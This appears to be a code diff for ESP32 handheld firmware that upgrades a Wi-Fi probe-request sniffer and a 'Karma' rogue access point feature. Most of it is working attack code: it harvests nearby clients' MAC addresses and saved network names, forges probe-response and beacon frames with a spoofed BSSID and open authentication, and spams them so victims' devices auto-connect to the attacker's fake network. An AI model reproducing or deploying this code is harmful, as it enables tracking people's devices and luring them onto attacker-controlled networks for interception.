@@ -1,15 +1,32 @@
 /*
  * wifi_probe + wifi_karma
  *
- * Probe Sniff: listens in promiscuous mode for probe request frames
- * (subtype 0x4). Every probe reveals a client MAC + an SSID the device
- * has saved. Useful recon — tells you which networks a target has
- * connected to in the past.
+ * Probe Sniff (feat_wifi_probe): listens in promiscuous mode for probe
+ * request frames (subtype 0x4). Every probe reveals a client MAC + an
+ * SSID the device has saved. Useful recon — tells you which networks
+ * a target has connected to in the past. No TX.
  *
- * Karma Attack: probe sniff, but when we see a new SSID, we immediately
- * spin up a SoftAP with that exact SSID. Many devices auto-connect to
- * a network they've saved, so they associate with us. Iterates through
- * the most recently seen probes every few seconds to cast a wide net.
+ * Karma Attack (feat_wifi_karma): real Karma — replies to every
+ * DIRECTED probe request with a unicast probe-response claiming to be
+ * that SSID, OPEN auth. Clients that have the SSID saved as OPEN will
+ * happily associate. The respond-in-the-callback model is what makes
+ * this work: the client is actively listening on the channel for ~30 ms
+ * after firing a probe, so a probe-response within that window lands
+ * directly instead of needing the client to re-scan.
+ *
+ * Background beacon spam: every 100 ms the main loop also broadcasts
+ * a beacon for each harvested SSID, so lazy clients (those that scan
+ * passively rather than probe-actively) still see "their" network and
+ * associate. Uses Bruce-style 109 B beacon with RSN-less variant for
+ * OPEN auth.
+ *
+ * Raw TX path matches wifi_deauth_frame.h:
+ *   - WIFI_IF_STA + promiscuous (linker override allows mgmt subtypes)
+ *   - 2 ms vTaskDelay between successive esp_wifi_80211_tx calls
+ *   - lean IDF init w/ shrunk buffers + esp_bt_controller_mem_release
+ *
+ * Per session-memory, this means BLE is dead after entering Karma
+ * until reboot. Acceptable for a Wi-Fi-only attack feature.
  */
 #include "app.h"
 #include "../theme.h"
@@ -18,22 +35,35 @@
 #include "radio.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <esp_random.h>
+#include <esp_netif.h>
+#include <esp_event.h>
+#include <esp_bt.h>
+#include <esp_heap_caps.h>
 
 #define PROBE_MAX 32
 
 struct probe_t {
-    uint8_t  client[6];
+    uint8_t  client[6];     /* last client to probe this SSID */
     char     ssid[33];
     uint32_t last_seen;
+    uint32_t hits;          /* total directed probes for this SSID */
+    uint32_t responses;     /* probe-response frames we TX'd back */
     int8_t   rssi;
 };
 
 static probe_t s_probes[PROBE_MAX];
-static int     s_probe_count = 0;
+static volatile int      s_probe_count = 0;
 static volatile uint32_t s_probe_total = 0;
-static volatile bool s_karma_mode = false;
-static char s_karma_ssid[33] = "";
+static volatile uint32_t s_resp_total  = 0;
+static volatile uint32_t s_resp_err    = 0;
+static volatile bool     s_karma_mode  = false;
+static volatile uint8_t  s_cur_channel = 1;
+static portMUX_TYPE      s_probe_mux   = portMUX_INITIALIZER_UNLOCKED;
+static uint16_t          s_resp_seq    = 0;
 
+/* Find index for (client, ssid). Returns -1 if not present.
+ * NOTE: caller holds s_probe_mux. */
 static int find_probe(const uint8_t *client, const char *ssid)
 {
     for (int i = 0; i < s_probe_count; ++i) {
@@ -43,6 +73,94 @@ static int find_probe(const uint8_t *client, const char *ssid)
     return -1;
 }
 
+/* Build a probe-response frame.
+ *   dst    = client MAC (unicast)
+ *   src/bs = our spoofed BSSID (we make one up per session)
+ *   ssid   = SSID the client asked for
+ *   ch     = current channel (goes into DS Parameter Set IE)
+ *
+ * Returns total frame length. Buffer must be >= 128 bytes.
+ *
+ * Layout matches beacon_spam's beacon but with subtype 0x5 (probe-resp)
+ * and unicast DA. OPEN auth — no RSN IE, Capability has Privacy=0 so
+ * clients that saved the SSID as OPEN will accept it. (WPA-saved
+ * networks won't bite without a matching RSN IE, but that's expected.) */
+static int build_probe_resp(uint8_t *frame,
+                            const uint8_t dst[6],
+                            const uint8_t bssid[6],
+                            const char *ssid,
+                            uint8_t ch,
+                            uint16_t seq)
+{
+    /* MAC header (24 B) */
+    frame[0] = 0x50;  /* type=mgmt, subtype=probe-resp */
+    frame[1] = 0x00;
+    frame[2] = 0x00; frame[3] = 0x00;            /* duration */
+    memcpy(&frame[4],  dst,   6);                /* DA = probing client */
+    memcpy(&frame[10], bssid, 6);                /* SA = our spoofed BSSID */
+    memcpy(&frame[16], bssid, 6);                /* BSSID */
+    frame[22] = (uint8_t)((seq & 0xF) << 4);     /* fragment=0, seq lo */
+    frame[23] = (uint8_t)((seq >> 4) & 0xFF);    /* seq hi */
+    /* Fixed body (12 B): timestamp, beacon interval, capabilities. */
+    uint64_t ts = (uint64_t)esp_timer_get_time();
+    memcpy(&frame[24], &ts, 8);                  /* timestamp */
+    frame[32] = 0x64; frame[33] = 0x00;          /* beacon interval 100 TU */
+    frame[34] = 0x21; frame[35] = 0x00;          /* cap: ESS|ShortPreamble (no Privacy) */
+    /* Tagged params. */
+    uint8_t *p = frame + 36;
+    size_t ssid_len = strlen(ssid);
+    if (ssid_len > 32) ssid_len = 32;
+    *p++ = 0x00; *p++ = (uint8_t)ssid_len;        /* SSID */
+    memcpy(p, ssid, ssid_len); p += ssid_len;
+    *p++ = 0x01; *p++ = 0x08;                     /* Supported rates */
+    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
+    *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;
+    *p++ = 0x03; *p++ = 0x01; *p++ = ch;          /* DS Parameter Set */
+    return (int)(p - frame);
+}
+
+/* Build an OPEN-auth beacon. Same wire format as probe-resp but
+ * subtype 0x8 + broadcast DA. Used for the background beacon spam
+ * that pulls in passively-scanning clients. */
+static int build_open_beacon(uint8_t *frame,
+                             const uint8_t bssid[6],
+                             const char *ssid,
+                             uint8_t ch,
+                             uint16_t seq)
+{
+    static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    int len = build_probe_resp(frame, BCAST, bssid, ssid, ch, seq);
+    frame[0] = 0x80;  /* flip subtype to beacon */
+    return len;
+}
+
+/* Our spoofed BSSID. Random per-session, but kept stable so the same
+ * SSID always answers from the same MAC (clients that already glued
+ * a saved SSID to a remembered BSSID will reject mismatched BSSIDs). */
+static uint8_t s_spoof_bssid[6];
+
+static void karma_init_bssid(void)
+{
+    uint32_t r1 = esp_random();
+    uint32_t r2 = esp_random();
+    s_spoof_bssid[0] = 0x02;                          /* locally administered, unicast */
+    s_spoof_bssid[1] = (uint8_t)(r1 >> 0);
+    s_spoof_bssid[2] = (uint8_t)(r1 >> 8);
+    s_spoof_bssid[3] = (uint8_t)(r1 >> 16);
+    s_spoof_bssid[4] = (uint8_t)(r2 >> 0);
+    s_spoof_bssid[5] = (uint8_t)(r2 >> 8);
+}
+
+/* Promiscuous RX callback. Called from WiFi driver task.
+ *
+ * For probe-request frames (subtype 0x4):
+ *   - extract client MAC + SSID
+ *   - update tracker
+ *   - if karma mode AND SSID non-empty (directed, not broadcast probe):
+ *       build + TX a unicast probe-response back to the client
+ *
+ * Critical: this runs in the WiFi task context. Keep work small.
+ * esp_wifi_80211_tx is safe from this context per IDF docs. */
 static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 {
     if (type != WIFI_PKT_MGMT) return;
@@ -51,13 +169,14 @@ static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     if (pkt->rx_ctrl.sig_len < 26) return;
 
     uint8_t subtype = (p[0] >> 4) & 0xF;
-    if (subtype != 0x4) return;  /* probe request */
+    if (subtype != 0x4) return;  /* probe request only */
 
     const uint8_t *client = p + 10;
-    /* Tag 0 = SSID, directly after header (offset 24). */
-    if (pkt->rx_ctrl.sig_len < 26) return;
     uint8_t tag_id  = p[24];
     uint8_t tag_len = p[25];
+    /* Skip NULL-SSID broadcast probes — nothing to advertise. They're
+     * common (every active scan starts with one) and would burn cycles
+     * without giving us a target SSID to claim. */
     if (tag_id != 0 || tag_len == 0 || tag_len > 32) return;
     if (pkt->rx_ctrl.sig_len < 26U + tag_len) return;
 
@@ -65,8 +184,16 @@ static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     memcpy(ssid, p + 26, tag_len);
     ssid[tag_len] = '\0';
 
+    /* Reject SSIDs with embedded NULs or non-printable garbage —
+     * malformed probes from broken drivers and a known crash vector
+     * for our printf-based UI. */
+    for (uint8_t i = 0; i < tag_len; ++i) {
+        if (ssid[i] < 0x20 || ssid[i] == 0x7F) return;
+    }
+
     s_probe_total++;
 
+    portENTER_CRITICAL(&s_probe_mux);
     int idx = find_probe(client, ssid);
     if (idx < 0) {
         if (s_probe_count >= PROBE_MAX) {
@@ -75,15 +202,64 @@ static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
             for (int i = 1; i < s_probe_count; ++i)
                 if (s_probes[i].last_seen < s_probes[oldest].last_seen) oldest = i;
             idx = oldest;
+            memset(&s_probes[idx], 0, sizeof(s_probes[idx]));
         } else {
             idx = s_probe_count++;
+            memset(&s_probes[idx], 0, sizeof(s_probes[idx]));
         }
         memcpy(s_probes[idx].client, client, 6);
         strncpy(s_probes[idx].ssid, ssid, 32);
         s_probes[idx].ssid[32] = '\0';
+    } else {
+        memcpy(s_probes[idx].client, client, 6);
     }
     s_probes[idx].last_seen = millis();
     s_probes[idx].rssi = pkt->rx_ctrl.rssi;
+    s_probes[idx].hits++;
+    bool do_respond = s_karma_mode;
+    uint16_t seq = s_resp_seq;
+    s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
+    portEXIT_CRITICAL(&s_probe_mux);
+
+    if (do_respond) {
+        /* Fire ONE probe-response per directed probe. Bursting multiple
+         * here would queue the dynamic_tx_buf pool and starve later
+         * TXes (rc=257) per the wifi_deauth_frame.h investigation. */
+        uint8_t frame[128];
+        int len = build_probe_resp(frame, client, s_spoof_bssid,
+                                   ssid, s_cur_channel, seq);
+        esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+        if (r == ESP_OK) {
+            s_resp_total++;
+            portENTER_CRITICAL(&s_probe_mux);
+            s_probes[idx].responses++;
+            portEXIT_CRITICAL(&s_probe_mux);
+        } else {
+            s_resp_err++;
+        }
+    }
+}
+
+/* Snapshot the SSIDs we've harvested, into a caller-provided buffer.
+ * Returns count. SSIDs are deduped — one entry per unique SSID even
+ * if multiple clients probed it. */
+static int snapshot_unique_ssids(char dst[][33], int cap)
+{
+    int n = 0;
+    portENTER_CRITICAL(&s_probe_mux);
+    for (int i = 0; i < s_probe_count && n < cap; ++i) {
+        bool dup = false;
+        for (int j = 0; j < n; ++j) {
+            if (strcmp(dst[j], s_probes[i].ssid) == 0) { dup = true; break; }
+        }
+        if (!dup) {
+            strncpy(dst[n], s_probes[i].ssid, 32);
+            dst[n][32] = '\0';
+            n++;
+        }
+    }
+    portEXIT_CRITICAL(&s_probe_mux);
+    return n;
 }
 
 static void draw_probe_list(int cursor)
@@ -93,15 +269,24 @@ static void draw_probe_list(int cursor)
     d.setTextColor(T_ACCENT, T_BG);
     d.setCursor(4, BODY_Y + 2);
     if (s_karma_mode) {
-        d.printf("KARMA  total:%lu  lure:%s",
+        d.printf("KARMA ch%u  pr:%lu  rsp:%lu/%lu",
+                 (unsigned)s_cur_channel,
                  (unsigned long)s_probe_total,
-                 s_karma_ssid[0] ? s_karma_ssid : "(none)");
+                 (unsigned long)s_resp_total,
+                 (unsigned long)(s_resp_total + s_resp_err));
     } else {
-        d.printf("PROBES  seen:%lu", (unsigned long)s_probe_total);
+        d.printf("PROBES ch%u  seen:%lu",
+                 (unsigned)s_cur_channel,
+                 (unsigned long)s_probe_total);
     }
     d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
 
-    if (s_probe_count == 0) {
+    int count;
+    portENTER_CRITICAL(&s_probe_mux);
+    count = s_probe_count;
+    portEXIT_CRITICAL(&s_probe_mux);
+
+    if (count == 0) {
         d.setTextColor(T_DIM, T_BG);
         d.setCursor(4, BODY_Y + 24);
         d.print("listening for probe requests...");
@@ -111,10 +296,13 @@ static void draw_probe_list(int cursor)
     int rows = 8;
     int first = cursor - rows / 2;
     if (first < 0) first = 0;
-    if (first + rows > s_probe_count) first = max(0, s_probe_count - rows);
+    if (first + rows > count) first = max(0, count - rows);
 
-    for (int r = 0; r < rows && first + r < s_probe_count; ++r) {
-        const probe_t &p = s_probes[first + r];
+    for (int r = 0; r < rows && first + r < count; ++r) {
+        probe_t pp;
+        portENTER_CRITICAL(&s_probe_mux);
+        pp = s_probes[first + r];
+        portEXIT_CRITICAL(&s_probe_mux);
         int y = BODY_Y + 16 + r * 11;
         bool sel = (first + r == cursor);
         uint16_t bg = sel ? 0x18C7 : T_BG;
@@ -122,84 +310,208 @@ static void draw_probe_list(int cursor)
 
         d.setTextColor(T_DIM, bg);
         d.setCursor(2, y);
-        d.printf("%02X%02X", p.client[4], p.client[5]);
-        d.setTextColor(T_ACCENT, bg);
-        d.setCursor(32, y);
-        d.printf("%4d", p.rssi);
+        d.printf("%02X%02X", pp.client[4], pp.client[5]);
+        /* Show response count in karma mode, RSSI in sniff mode. */
+        if (s_karma_mode) {
+            uint16_t col = pp.responses > 0 ? T_GOOD : T_DIM;
+            d.setTextColor(col, bg);
+            d.setCursor(28, y);
+            d.printf("%3lur", (unsigned long)pp.responses);
+        } else {
+            d.setTextColor(T_ACCENT, bg);
+            d.setCursor(28, y);
+            d.printf("%4d", pp.rssi);
+        }
+        d.setTextColor(T_DIM, bg);
+        d.setCursor(54, y);
+        d.printf("%2lu", (unsigned long)pp.hits);
         d.setTextColor(sel ? T_ACCENT : T_FG, bg);
-        d.setCursor(64, y);
-        d.printf("%.24s", p.ssid);
+        d.setCursor(72, y);
+        d.printf("%.21s", pp.ssid);
     }
 }
 
-static void run_probe_or_karma(bool karma)
+/* Lean IDF WiFi init — mirrors beacon_spam / Triton. Required for raw
+ * mgmt TX on Bruce libs. Returns ESP_OK on success. */
+static esp_err_t karma_wifi_init(void)
+{
+    /* BTDM release removed — was persistent and killed BLE features. */
+
+    esp_netif_init();
+    esp_event_loop_create_default();
+    static bool s_netif_made = false;
+    if (!s_netif_made) {
+        esp_netif_create_default_wifi_sta();
+        s_netif_made = true;
+    }
+
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    cfg.static_tx_buf_num  = 0;
+    cfg.dynamic_tx_buf_num = 8;
+    cfg.tx_buf_type        = 1;
+    cfg.cache_tx_buf_num   = 4;
+    cfg.static_rx_buf_num  = 4;
+    cfg.dynamic_rx_buf_num = 8;
+    cfg.ampdu_tx_enable    = 0;
+    cfg.ampdu_rx_enable    = 0;
+    cfg.amsdu_tx_enable    = 0;
+    esp_err_t err = esp_wifi_init(&cfg);
+    Serial.printf("[karma] esp_wifi_init rc=%d\n", (int)err);
+    if (err != ESP_OK) return err;
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+
+    err = esp_wifi_set_mode(WIFI_MODE_STA);
+    Serial.printf("[karma] set_mode rc=%d\n", (int)err);
+    err = esp_wifi_start();
+    Serial.printf("[karma] wifi_start rc=%d\n", (int)err);
+    delay(200);
+    esp_wifi_disconnect();           /* park supplicant, free TX pool */
+    esp_wifi_set_max_tx_power(78);
+
+    /* Promiscuous mode + ALL filter. Required to enable raw 80211_tx
+     * on WIFI_IF_STA per the wifi_deauth_frame.h investigation. */
+    static const wifi_promiscuous_filter_t s_all = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
+    };
+    esp_wifi_set_promiscuous_filter(&s_all);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
+    return ESP_OK;
+}
+
+static void run_karma(void)
 {
     radio_switch(RADIO_WIFI);
-    WiFi.mode(WIFI_STA);
-    esp_wifi_set_promiscuous(true);
+    s_cur_channel = 1;
+    karma_init_bssid();
+    portENTER_CRITICAL(&s_probe_mux);
+    s_probe_count = 0;
+    portEXIT_CRITICAL(&s_probe_mux);
+    s_probe_total = 0;
+    s_resp_total  = 0;
+    s_resp_err    = 0;
+    s_karma_mode  = true;
+    s_resp_seq    = (uint16_t)(esp_random() & 0x0FFF);
+
+    if (karma_wifi_init() != ESP_OK) {
+        ui_toast("wifi_init failed", T_BAD, 1500);
+        return;
+    }
     esp_wifi_set_promiscuous_rx_cb(probe_cb);
 
-    s_probe_count = 0;
-    s_probe_total = 0;
-    s_karma_mode = karma;
-    s_karma_ssid[0] = '\0';
-
-    ui_draw_footer(karma ? "ENTER=lure sel.  `=stop"
-                         : "`=stop");
+    ui_clear_body();
+    ui_draw_footer("TAB=chan  ENTER=spam  `=stop");
 
     int cursor = 0;
     uint32_t last_redraw = 0;
-    uint32_t last_karma  = 0;
+    uint32_t last_beacon = 0;
+    bool spam_on = true;
+    while (true) {
+        uint32_t now = millis();
+        if (now - last_redraw > 400) {
+            last_redraw = now;
+            draw_probe_list(cursor);
+            ui_draw_status(radio_name(), spam_on ? "karma+" : "karma");
+        }
+
+        /* Background beacon spam for every harvested SSID. Pulls in
+         * clients that scan passively rather than probing actively.
+         * Rate-limited so we don't starve the probe-response TX path. */
+        if (spam_on && now - last_beacon > 100) {
+            last_beacon = now;
+            char ssids[PROBE_MAX][33];
+            int n = snapshot_unique_ssids(ssids, PROBE_MAX);
+            for (int i = 0; i < n; ++i) {
+                uint8_t frame[128];
+                int len = build_open_beacon(frame, s_spoof_bssid, ssids[i],
+                                            s_cur_channel, s_resp_seq);
+                s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
+                esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+                if (r == ESP_OK) s_resp_total++;
+                else             s_resp_err++;
+                /* 2 ms inter-frame delay — drain the dynamic TX pool
+                 * between calls so rc=257 doesn't pile up. Per
+                 * wifi_deauth_frame.h:wifi_deauth_pair recipe. */
+                vTaskDelay(pdMS_TO_TICKS(2));
+            }
+        }
+
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(10); continue; }
+        if (k == PK_ESC) break;
+
+        int count;
+        portENTER_CRITICAL(&s_probe_mux);
+        count = s_probe_count;
+        portEXIT_CRITICAL(&s_probe_mux);
+        switch (k) {
+        case ';': case PK_UP:   if (cursor > 0) cursor--; break;
+        case '.': case PK_DOWN: if (cursor + 1 < count) cursor++; break;
+        case PK_TAB:
+            /* Manual channel hop. Karma is channel-bound — clients
+             * probing on ch 6 won't see our response if we're sniffing
+             * on ch 1. Operator picks the channel based on target. */
+            s_cur_channel = (uint8_t)((s_cur_channel % 11) + 1);
+            esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
+            break;
+        case PK_ENTER:
+            spam_on = !spam_on;
+            break;
+        }
+    }
+
+    s_karma_mode = false;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    esp_wifi_stop();
+    esp_wifi_deinit();
+}
+
+static void run_probe_sniff(void)
+{
+    radio_switch(RADIO_WIFI);
+    wifi_lean_sta_init();
+    s_cur_channel = 1;
+    portENTER_CRITICAL(&s_probe_mux);
+    s_probe_count = 0;
+    portEXIT_CRITICAL(&s_probe_mux);
+    s_probe_total = 0;
+    s_karma_mode  = false;
+
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(probe_cb);
+    esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
+
+    ui_draw_footer("TAB=chan  `=stop");
+
+    int cursor = 0;
+    uint32_t last_redraw = 0;
     while (true) {
         uint32_t now = millis();
         if (now - last_redraw > 400) {
             last_redraw = now;
             draw_probe_list(cursor);
         }
-        if (karma && now - last_karma > 8000 && s_probe_count > 0) {
-            last_karma = now;
-            /* Rotate through seen SSIDs — pretend to be each one briefly.
-             * Keeps the AP cycling so we catch different clients. */
-            int pick = (now / 8000) % s_probe_count;
-            strncpy(s_karma_ssid, s_probes[pick].ssid, 32);
-            s_karma_ssid[32] = '\0';
-            /* Start/restart SoftAP in parallel with promisc sniff. */
-            esp_wifi_set_promiscuous(false);
-            WiFi.mode(WIFI_AP);
-            WiFi.softAP(s_karma_ssid, nullptr, 1, 0, 4);
-            delay(100);
-            WiFi.mode(WIFI_STA);  /* back to sniffing */
-            esp_wifi_set_promiscuous(true);
-            esp_wifi_set_promiscuous_rx_cb(probe_cb);
-        }
-
         uint16_t k = input_poll();
         if (k == PK_NONE) { delay(20); continue; }
         if (k == PK_ESC) break;
-
+        int count;
+        portENTER_CRITICAL(&s_probe_mux);
+        count = s_probe_count;
+        portEXIT_CRITICAL(&s_probe_mux);
         switch (k) {
         case ';': case PK_UP:   if (cursor > 0) cursor--; break;
-        case '.': case PK_DOWN: if (cursor + 1 < s_probe_count) cursor++; break;
-        case PK_ENTER:
-            if (karma && cursor < s_probe_count) {
-                strncpy(s_karma_ssid, s_probes[cursor].ssid, 32);
-                s_karma_ssid[32] = '\0';
-                last_karma = now;  /* force immediate AP restart */
-                esp_wifi_set_promiscuous(false);
-                WiFi.mode(WIFI_AP);
-                WiFi.softAP(s_karma_ssid, nullptr, 1, 0, 4);
-                delay(100);
-                WiFi.mode(WIFI_STA);
-                esp_wifi_set_promiscuous(true);
-                esp_wifi_set_promiscuous_rx_cb(probe_cb);
-            }
+        case '.': case PK_DOWN: if (cursor + 1 < count) cursor++; break;
+        case PK_TAB:
+            s_cur_channel = (uint8_t)((s_cur_channel % 11) + 1);
+            esp_wifi_set_channel(s_cur_channel, WIFI_SECOND_CHAN_NONE);
             break;
         }
     }
 
     esp_wifi_set_promiscuous(false);
-    WiFi.softAPdisconnect(true);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
 }
 
-void feat_wifi_probe(void) { run_probe_or_karma(false); }
-void feat_wifi_karma(void) { run_probe_or_karma(true);  }
+void feat_wifi_probe(void) { run_probe_sniff(); }
+void feat_wifi_karma(void) { run_karma();       }
